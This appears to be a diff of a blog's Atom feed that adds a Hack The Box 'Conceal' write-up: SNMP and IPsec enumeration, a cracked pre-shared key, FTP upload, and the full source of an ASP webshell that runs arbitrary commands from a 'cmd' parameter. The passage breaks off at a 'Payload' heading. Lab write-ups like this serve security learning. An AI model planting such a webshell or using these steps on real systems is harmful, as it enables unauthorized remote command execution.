@@ -1,4 +1,535 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-05-11T16:11:26+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - Lightweight</title><link href="http://localhost:4000/hack-the-box/lightweight/" rel="alternate" type="text/html" title="Hack The Box - Lightweight" /><published>2019-05-11T00:00:00+02:00</published><updated>2019-05-11T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/lightweight</id><content type="html" xml:base="http://localhost:4000/hack-the-box/lightweight/">&lt;hr /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-05-18T16:34:13+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - Conceal</title><link href="http://localhost:4000/hack-the-box/conceal/" rel="alternate" type="text/html" title="Hack The Box - Conceal" /><published>2019-05-18T00:00:00+02:00</published><updated>2019-05-18T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/conceal</id><content type="html" xml:base="http://localhost:4000/hack-the-box/conceal/">&lt;hr /&gt;
+
+&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
+&lt;h4 id=&quot;hey-guys-today-conceal-retired-and-heres-my-write-up-about-it-conceal-was-a-straightforward-fun-box-the-only-tricky-part-about-it-is-gaining-ipsec-connection-to-gain-access-to-some-filtered-services-that-first-part-involved-some-guessing-but-after-that-everything-is-simple-and-very-straightforward-i-liked-this-machine-and-it-was-a-very-fun-one-its-a-windows-machine-and-its-ip-is-101010116-i-added-it-to-etchosts-as-concealhtb-lets-jump-right-in&quot;&gt;Hey guys today Conceal retired and here’s my write-up about it. Conceal was a straightforward fun box, The only tricky part about it is gaining &lt;a href=&quot;https://en.wikipedia.org/wiki/IPsec&quot;&gt;IPSEC&lt;/a&gt; connection to gain access to some filtered services. That first part involved some guessing but after that everything is simple and very straightforward. I liked this machine and it was a very fun one. It’s a windows machine and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.116&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;conceal.htb&lt;/code&gt;. Let’s jump right in.&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services.&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC conceal.htb&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/conceal/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;and-we-got-nothing-&quot;&gt;And we got nothing !&lt;/h4&gt;
+&lt;h4 id=&quot;i-ran-another-nmap-udp-scan-on-all-ports-&quot;&gt;I ran another &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; UDP scan on all ports :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -vvv -sU -o nmapudp conceal.htb --max-retries 0&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&quot;the-output-was-too-long-so-i-will-show-the-only-important-part-&quot;&gt;The output was too long so I will show the only important part :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/2.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/conceal/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;it-was-not-sure-about-port-161-but-it-showed-that-port-500-is-open&quot;&gt;It was not sure about port 161, but it showed that port 500 is open.&lt;/h4&gt;
+&lt;h4 id=&quot;i-ran-a-third-scan-on-ports-500-and-161-&quot;&gt;I ran a third scan on ports 500 and 161 :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p 161,500 -sV -sU -sC conceal.htb&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/conceal/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;full-output-&quot;&gt;Full Output :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.70 scan initiated Fri May 17 16:37:52 2019 as: nmap -p 161,500 -sV -sU -sC -o nmapudp2 conceal.htb
+Nmap scan report for conceal.htb (10.10.10.116)
+Host is up (0.20s latency).
+
+PORT    STATE SERVICE VERSION
+161/udp open  snmp    SNMPv1 server (public)
+| snmp-interfaces: 
+|   Software Loopback Interface 1\x00
+|     IP address: 127.0.0.1  Netmask: 255.0.0.0
+|     Type: softwareLoopback  Speed: 1 Gbps
+|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
+|   Intel(R) 82574L Gigabit Network Connection\x00
+|     IP address: 10.10.10.116  Netmask: 255.255.255.0
+|     MAC address: 00:50:56:b9:55:a7 (VMware)
+|     Type: ethernetCsmacd  Speed: 1 Gbps
+|     Traffic stats: 399.03 Kb sent, 6.41 Mb received
+|   Intel(R) 82574L Gigabit Network Connection-WFP Native MAC Layer LightWeight Filter-0000\x00
+|     MAC address: 00:50:56:b9:55:a7 (VMware)
+|     Type: ethernetCsmacd  Speed: 1 Gbps
+|     Traffic stats: 399.03 Kb sent, 6.41 Mb received
+|   Intel(R) 82574L Gigabit Network Connection-QoS Packet Scheduler-0000\x00
+|     MAC address: 00:50:56:b9:55:a7 (VMware)
+|     Type: ethernetCsmacd  Speed: 1 Gbps
+|     Traffic stats: 399.03 Kb sent, 6.41 Mb received
+|   Intel(R) 82574L Gigabit Network Connection-WFP 802.3 MAC Layer LightWeight Filter-0000\x00
+|     MAC address: 00:50:56:b9:55:a7 (VMware)
+|     Type: ethernetCsmacd  Speed: 1 Gbps
+|_    Traffic stats: 399.03 Kb sent, 6.41 Mb received
+| snmp-netstat: 
+|   TCP  0.0.0.0:21           0.0.0.0:0
+|   TCP  0.0.0.0:80           0.0.0.0:0
+|   TCP  0.0.0.0:135          0.0.0.0:0
+|   TCP  0.0.0.0:445          0.0.0.0:0
+|   TCP  0.0.0.0:49664        0.0.0.0:0
+|   TCP  0.0.0.0:49665        0.0.0.0:0
+|   TCP  0.0.0.0:49666        0.0.0.0:0
+|   TCP  0.0.0.0:49667        0.0.0.0:0
+|   TCP  0.0.0.0:49668        0.0.0.0:0
+|   TCP  0.0.0.0:49669        0.0.0.0:0
+|   TCP  0.0.0.0:49670        0.0.0.0:0
+|   TCP  10.10.10.116:139     0.0.0.0:0
+|   UDP  0.0.0.0:123          *:*
+|   UDP  0.0.0.0:161          *:*
+|   UDP  0.0.0.0:500          *:*
+|   UDP  0.0.0.0:4500         *:*
+|   UDP  0.0.0.0:5050         *:*
+|   UDP  0.0.0.0:5353         *:*
+|   UDP  0.0.0.0:5355         *:*
+|   UDP  10.10.10.116:137     *:*
+|   UDP  10.10.10.116:138     *:*
+|   UDP  10.10.10.116:1900    *:*
+|   UDP  10.10.10.116:65496   *:*
+|   UDP  127.0.0.1:1900       *:*
+|_  UDP  127.0.0.1:65497      *:*
+| snmp-processes: 
+|   1: 
+|     Name: System Idle Process
+|   4: 
+|     Name: System
+|   308: 
+|     Name: smss.exe
+|   348: 
+|     Name: svchost.exe
+|     Path: C:\Windows\System32\
+|     Params: -k LocalSystemNetworkRestricted
+|   392: 
+|     Name: csrss.exe
+|   468: 
+|     Name: svchost.exe
+|     Path: C:\Windows\system32\
+|     Params: -k LocalService
+|   472: 
+|     Name: wininit.exe
+|   484: 
+|     Name: csrss.exe
+|   564: 
+|     Name: winlogon.exe
+|   584: 
+|     Name: services.exe
+|   616: 
+|     Name: lsass.exe
+|     Path: C:\Windows\system32\
+|   696: 
+|     Name: fontdrvhost.exe
+|   704: 
+|     Name: fontdrvhost.exe
+|   712: 
+|     Name: svchost.exe
+|     Path: C:\Windows\system32\
+|     Params: -k DcomLaunch
+|   812: 
+|     Name: svchost.exe
+|     Path: C:\Windows\system32\
+|     Params: -k RPCSS
+|   900: 
+|     Name: svchost.exe
+|     Path: C:\Windows\System32\
+|     Params: -k NetworkService
+|   908: 
+|     Name: dwm.exe
+|   940: 
+|     Name: svchost.exe
+|     Path: C:\Windows\system32\
+|     Params: -k netsvcs
+|   976: 
+|     Name: svchost.exe
+|     Path: C:\Windows\System32\
+|     Params: -k LocalServiceNetworkRestricted
+|   984: 
+|     Name: svchost.exe
+|     Path: C:\Windows\system32\
+|     Params: -k LocalServiceNoNetwork
+|   1140: 
+|     Name: vmacthlp.exe
+|     Path: C:\Program Files\VMware\VMware Tools\
+|   1232: 
+|     Name: svchost.exe
+|     Path: C:\Windows\System32\
+|     Params: -k LocalServiceNetworkRestricted
+|   1248: 
+|     Name: svchost.exe
+|     Path: C:\Windows\system32\
+|     Params: -k LocalSystemNetworkRestricted
+|   1292: 
+|     Name: LogonUI.exe
+|     Params:  /flags:0x0 /state0:0xa3a2c855 /state1:0x41c64e6d
+|   1392: 
+|     Name: svchost.exe
+|     Path: C:\Windows\system32\
+|     Params: -k LocalServiceNetworkRestricted
+|   1400: 
+|     Name: svchost.exe
+|     Path: C:\Windows\System32\
+|     Params: -k LocalServiceNetworkRestricted
+|   1492: 
+|     Name: spoolsv.exe
+|     Path: C:\Windows\System32\
+|   1728: 
+|     Name: svchost.exe
+|     Path: C:\Windows\system32\
+|     Params: -k apphost
+|   1748: 
+|     Name: svchost.exe
+|     Path: C:\Windows\System32\
+|     Params: -k utcsvc
+|   1788: 
+|     Name: svchost.exe
+|     Path: C:\Windows\system32\
+|     Params: -k ftpsvc
+|   1856: 
+|     Name: SecurityHealthService.exe
+|   1868: 
+|     Name: snmp.exe
+|     Path: C:\Windows\System32\
+|   1892: 
+|     Name: VGAuthService.exe
+|     Path: C:\Program Files\VMware\VMware Tools\VMware VGAuth\
+|   1912: 
+|     Name: vmtoolsd.exe
+|     Path: C:\Program Files\VMware\VMware Tools\
+|   1932: 
+|     Name: ManagementAgentHost.exe
+|     Path: C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\
+|   1956: 
+|     Name: svchost.exe
+|     Path: C:\Windows\system32\
+|     Params: -k iissvcs
+|   1980: 
+|     Name: MsMpEng.exe
+|   2068: 
+|     Name: Memory Compression
+|   2204: 
+|     Name: svchost.exe
+|     Path: C:\Windows\system32\
+|     Params: -k LocalServiceAndNoImpersonation
+|   2444: 
+|     Name: svchost.exe
+|     Path: C:\Windows\system32\
+|     Params: -k NetworkServiceNetworkRestricted
+|   2952: 
+|     Name: WmiPrvSE.exe
+|     Path: C:\Windows\system32\wbem\
+|   2976: 
+|     Name: NisSrv.exe
+|   3052: 
+|     Name: dllhost.exe
+|     Path: C:\Windows\system32\
+|     Params: /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
+|   3132: 
+|     Name: SearchIndexer.exe
+|     Path: C:\Windows\system32\
+|     Params: /Embedding
+|   3280: 
+|     Name: svchost.exe
+|     Path: C:\Windows\system32\
+|     Params: -k appmodel
+|   3376: 
+|     Name: msdtc.exe
+|     Path: C:\Windows\System32\
+|   3948: 
+|     Name: svchost.exe
+|   5004: 
+|     Name: SearchFilterHost.exe
+|     Path: C:\Windows\system32\
+|     Params:  0 700 704 712 8192 708 
+|   5032: 
+|     Name: SearchProtocolHost.exe
+|     Path: C:\Windows\system32\
+|_    Params:  Global\UsGthrFltPipeMssGthrPipe23_ Global\UsGthrCtrlFltPipeMssGthrPipe23 1 -2147483646 &quot;Software\Microsoft\Windows Search&quot; &quot;Moz
+| snmp-sysdescr: Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)
+|_  System uptime: 2h08m26.61s (770661 timeticks)
+| snmp-win32-services: 
+|   Application Host Helper Service
+|   Background Intelligent Transfer Service
+|   Background Tasks Infrastructure Service
+|   Base Filtering Engine
+|   CNG Key Isolation
+|   COM+ Event System
+|   COM+ System Application
+|   Client License Service (ClipSVC)
+|   Connected Devices Platform Service
+|   Connected User Experiences and Telemetry
+|   CoreMessaging
+|   Cryptographic Services
+|   DCOM Server Process Launcher
+|   DHCP Client
+|   DNS Client
+|   Data Sharing Service
+|   Data Usage
+|   Device Setup Manager
+|   Diagnostic Policy Service
+|   Diagnostic Service Host
+|   Distributed Link Tracking Client
+|   Distributed Transaction Coordinator
+|   Geolocation Service
+|   Group Policy Client
+|   IKE and AuthIP IPsec Keying Modules
+|   IP Helper
+|   IPsec Policy Agent
+|   Local Session Manager
+|   Microsoft Account Sign-in Assistant
+|   Microsoft FTP Service
+|   Network Connection Broker
+|   Network List Service
+|   Network Location Awareness
+|   Network Store Interface Service
+|   Plug and Play
+|   Power
+|   Print Spooler
+|   Program Compatibility Assistant Service
+|   RPC Endpoint Mapper
+|   Remote Procedure Call (RPC)
+|   SNMP Service
+|   SSDP Discovery
+|   Security Accounts Manager
+|   Security Center
+|   Server
+|   Shell Hardware Detection
+|   State Repository Service
+|   Storage Service
+|   Superfetch
+|   System Event Notification Service
+|   System Events Broker
+|   TCP/IP NetBIOS Helper
+|   Task Scheduler
+|   Themes
+|   Tile Data model server
+|   Time Broker
+|   TokenBroker
+|   User Manager
+|   User Profile Service
+|   VMware Alias Manager and Ticket Service
+|   VMware CAF Management Agent Service
+|   VMware Physical Disk Helper Service
+|   VMware Tools
+|   WinHTTP Web Proxy Auto-Discovery Service
+|   Windows Audio
+|   Windows Audio Endpoint Builder
+|   Windows Connection Manager
+|   Windows Defender Antivirus Network Inspection Service
+|   Windows Defender Antivirus Service
+|   Windows Defender Security Centre Service
+|   Windows Driver Foundation - User-mode Driver Framework
+|   Windows Event Log
+|   Windows Firewall
+|   Windows Font Cache Service
+|   Windows Management Instrumentation
+|   Windows Process Activation Service
+|   Windows Push Notifications System Service
+|   Windows Search
+|   Windows Time
+|   Workstation
+|_  World Wide Web Publishing Service
+| snmp-win32-software: 
+|   Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161; 2018-10-12T20:10:30
+|   Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161; 2018-10-12T20:10:22
+|_  VMware Tools; 2018-10-12T20:11:02
+| snmp-win32-users: 
+|   Administrator
+|   DefaultAccount
+|   Destitute
+|_  Guest
+500/udp open  isakmp  Microsoft Windows 8
+| ike-version: 
+|   vendor_id: Microsoft Windows 8
+|   attributes: 
+|     MS NT5 ISAKMPOAKLEY
+|     RFC 3947 NAT-T
+|     draft-ietf-ipsec-nat-t-ike-02\n
+|     IKE FRAGMENTATION
+|     MS-Negotiation Discovery Capable
+|_    IKE CGA version 1
+Service Info: Host: Conceal; OS: Windows 8; CPE: cpe:/o:microsoft:windows:8, cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri May 17 16:42:05 2019 -- 1 IP address (1 host up) scanned in 253.58 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;we-have-two-services-to-enumerate-isakmp-which-is-ipsec-and-snmp&quot;&gt;We have two services to enumerate. &lt;code class=&quot;highlighter-rouge&quot;&gt;isakmp&lt;/code&gt; which is &lt;code class=&quot;highlighter-rouge&quot;&gt;IPSEC&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;snmp&lt;/code&gt;.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;snmp-enumeration&quot;&gt;Snmp Enumeration&lt;/h3&gt;
+&lt;h4 id=&quot;i-started-with-snmpwalk-&quot;&gt;I started with &lt;code class=&quot;highlighter-rouge&quot;&gt;snmpwalk&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;snmpwalk -c public -v 1 conceal.htb&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&quot;the-output-was-very-long-but-we-only-need-this-first-part-&quot;&gt;The output was very long but we only need this first part :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-have-a-password-hash-for-the-ipsec-connection--9c8b1a372b1878851be2c097031b6e43&quot;&gt;We have a password hash for the &lt;code class=&quot;highlighter-rouge&quot;&gt;IPSEC&lt;/code&gt; connection : &lt;code class=&quot;highlighter-rouge&quot;&gt;9C8B1A372B1878851BE2C097031B6E43&lt;/code&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;i-used-crackstation-to-crack-it-and-i-got-this-result-&quot;&gt;I used &lt;a href=&quot;https://crackstation.net/&quot;&gt;crackstation&lt;/a&gt; to crack it and I got this result :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;great--now-we-need-to-enumerate-the-ike-vpn-service-to-know-how-to-connect-to-it&quot;&gt;Great ! Now we need to enumerate the &lt;code class=&quot;highlighter-rouge&quot;&gt;ike&lt;/code&gt; vpn service to know how to connect to it.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;ike-scan-setting-up-the-connection&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ike-scan&lt;/code&gt;, Setting up The Connection&lt;/h3&gt;
+&lt;h4 id=&quot;i-ran-ike-scan-and-got-these-results-&quot;&gt;I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;ike-scan&lt;/code&gt; and got these results :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;i-installed-strongswan-to-set-up-the-ipsec-connection-with-the-help-of-the-info-i-got-from-ike-scan-and-some-guessing-i-could-come-up-with-this-configuration-which-worked-&quot;&gt;I installed &lt;code class=&quot;highlighter-rouge&quot;&gt;strongswan&lt;/code&gt; to set up the &lt;code class=&quot;highlighter-rouge&quot;&gt;IPSEC&lt;/code&gt; connection. With the help of the info I got from &lt;code class=&quot;highlighter-rouge&quot;&gt;ike-scan&lt;/code&gt; and some guessing I could come up with this configuration which worked :&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/ipsec.conf&lt;/code&gt; :
+&lt;img src=&quot;/images/hackthebox/conceal/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;conn rick-to-conceal
+        authby=secret
+        auto=route
+        keyexchange=ikev1
+        ike=3des-sha1-modp1024
+        left=10.10.xx.xx
+        right=10.10.10.116
+        type=transport
+        esp=3des-sha1
+        rightprotoport=tcp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/ipsec.secrets&lt;/code&gt; :
+&lt;img src=&quot;/images/hackthebox/conceal/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;10.10.xx.xx 10.10.10.116 : PSK &quot;Dudecake1!&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;i-started-ipsec-then-i-initialized-the-connection-&quot;&gt;I started &lt;code class=&quot;highlighter-rouge&quot;&gt;ipsec&lt;/code&gt; then I initialized the connection :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ipsec start&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;ipsec up rick-to-conceal&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/conceal/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;it-worked-fine-now-we-are-connected-to-a-vpn-network-lets-see-what-new-services-can-we-get&quot;&gt;It worked fine, now we are connected to a vpn network let’s see what new services can we get.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;nmap-second-time&quot;&gt;Nmap (Second Time)&lt;/h3&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC conceal.htb&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/conceal/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-got-ftp-on-port-21--http-on-port-80-and-smb-on-port-445-i-wanted-to-check-ftp-first-and-see-if-i-can-authenticate-anonymously&quot;&gt;We got ftp on port 21 , http on port 80 and smb on port 445. I wanted to check ftp first and see if I can authenticate anonymously.&lt;/h4&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;ftp-file-upload-reverse-shell-and-user-flag&quot;&gt;FTP, File Upload, Reverse Shell and User Flag&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;it-worked-but-there-was-literally-nothing-on-that-ftp-server-i-uploaded-a-test-file-to-check-if-i-have-write-permissions-on-that-ftp-server-and-i-had&quot;&gt;It worked but there was literally nothing on that ftp server. I uploaded a test file to check if I have write permissions on that ftp server and I had.&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;i-checked-the-http-service-and-there-was-only-the-default-iis-page-&quot;&gt;I Checked the http service and there was only the default IIS page :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;i-ran-gobuster-with-usrsharewordlistsdirbcommontxt-and-got-only-one-directory-called-uplaod-&quot;&gt;I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/wordlists/dirb/common.txt&lt;/code&gt; and got only one directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;/uplaod&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster -u http://conceal.htb/ -w /usr/share/wordlists/dirb/common.txt
+
+=====================================================
+Gobuster v2.0.0              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://conceal.htb/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2019/05/17 17:18:57 Starting gobuster
+=====================================================
+/upload (Status: 301)
+=====================================================
+2019/05/17 17:28:23 Finished
+=====================================================
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;i-went-to-upload-and-found-my-test-file-&quot;&gt;I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;/upload&lt;/code&gt; and found my test file :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;great--i-uploaded-an-asp-shell-to-get-remote-code-execution-&quot;&gt;Great ! I uploaded an &lt;code class=&quot;highlighter-rouge&quot;&gt;asp&lt;/code&gt; shell to get remote code execution :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;shellasp-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;shell.asp&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;!--
+ASP Webshell
+Working on latest IIS 
+Referance :- 
+https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp
+http://stackoverflow.com/questions/11501044/i-need-execute-a-command-line-in-a-visual-basic-script
+http://www.w3schools.com/asp/
+--&amp;gt;
+
+
+&amp;lt;%
+Set oScript = Server.CreateObject(&quot;WSCRIPT.SHELL&quot;)
+Set oScriptNet = Server.CreateObject(&quot;WSCRIPT.NETWORK&quot;)
+Set oFileSys = Server.CreateObject(&quot;Scripting.FileSystemObject&quot;)
+Function getCommandOutput(theCommand)
+    Dim objShell, objCmdExec
+    Set objShell = CreateObject(&quot;WScript.Shell&quot;)
+    Set objCmdExec = objshell.exec(thecommand)
+    getCommandOutput = objCmdExec.StdOut.ReadAll
+end Function
+%&amp;gt;
+
+
+&amp;lt;HTML&amp;gt;
+&amp;lt;BODY&amp;gt;
+&amp;lt;FORM action=&quot;&quot; method=&quot;GET&quot;&amp;gt;
+&amp;lt;input type=&quot;text&quot; name=&quot;cmd&quot; size=45 value=&quot;&amp;lt;%= szCMD %&amp;gt;&quot;&amp;gt;
+&amp;lt;input type=&quot;submit&quot; value=&quot;Run&quot;&amp;gt;
+&amp;lt;/FORM&amp;gt;
+&amp;lt;PRE&amp;gt;
+&amp;lt;%= &quot;\\&quot; &amp;amp; oScriptNet.ComputerName &amp;amp; &quot;\&quot; &amp;amp; oScriptNet.UserName %&amp;gt;
+&amp;lt;%Response.Write(Request.ServerVariables(&quot;server_name&quot;))%&amp;gt;
+&amp;lt;p&amp;gt;
+&amp;lt;b&amp;gt;The server's port:&amp;lt;/b&amp;gt;
+&amp;lt;%Response.Write(Request.ServerVariables(&quot;server_port&quot;))%&amp;gt;
+&amp;lt;/p&amp;gt;
+&amp;lt;p&amp;gt;
+&amp;lt;b&amp;gt;The server's software:&amp;lt;/b&amp;gt;
+&amp;lt;%Response.Write(Request.ServerVariables(&quot;server_software&quot;))%&amp;gt;
+&amp;lt;/p&amp;gt;
+&amp;lt;p&amp;gt;
+&amp;lt;b&amp;gt;The server's software:&amp;lt;/b&amp;gt;
+&amp;lt;%Response.Write(Request.ServerVariables(&quot;LOCAL_ADDR&quot;))%&amp;gt;
+&amp;lt;% szCMD = request(&quot;cmd&quot;)
+thisDir = getCommandOutput(&quot;cmd /c&quot; &amp;amp; szCMD)
+Response.Write(thisDir)%&amp;gt;
+&amp;lt;/p&amp;gt;
+&amp;lt;br&amp;gt;
+&amp;lt;/BODY&amp;gt;
+&amp;lt;/HTML&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/17.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/conceal/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;i-got-a-powershell-reverse-shell-&quot;&gt;I got a powershell reverse shell :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;payload-&quot;&gt;Payload :&lt;/h4&gt;
